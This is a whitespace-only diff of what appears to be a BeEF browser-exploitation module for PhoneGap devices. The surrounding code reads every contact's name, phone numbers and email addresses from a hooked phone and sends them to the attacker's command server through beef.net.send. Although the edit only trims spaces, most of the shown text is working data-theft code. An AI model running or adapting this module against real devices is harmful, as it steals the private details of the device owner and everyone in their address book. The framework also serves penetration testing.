@@ -13,7 +13,7 @@ beef.execute(function() {
 
          for (var i=0; i<contacts.length; i++) {
             result = contacts[i].displayName;
-            
+
             for (var j=0; j<contacts[i].phoneNumbers.length; j++) {
                 result = result + ' #:' + contacts[i].phoneNumbers[j].value;
             }
@@ -22,22 +22,22 @@ beef.execute(function() {
                 result = result + ' @:' + contacts[i].emails[j].value;
             }
 
-            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );    
+            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
 
         }
     };
 
     function onError(contactError) {
         result = 'fail';
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
     };
 
 
     var options = new ContactFindOptions();
     options.filter="";
-    options.multiple=true; 
+    options.multiple=true;
     var fields = ["displayName", "phoneNumbers", "emails"];
-    
+
     navigator.contacts.find(fields, onSuccess, onError, options);
-    
+
 });
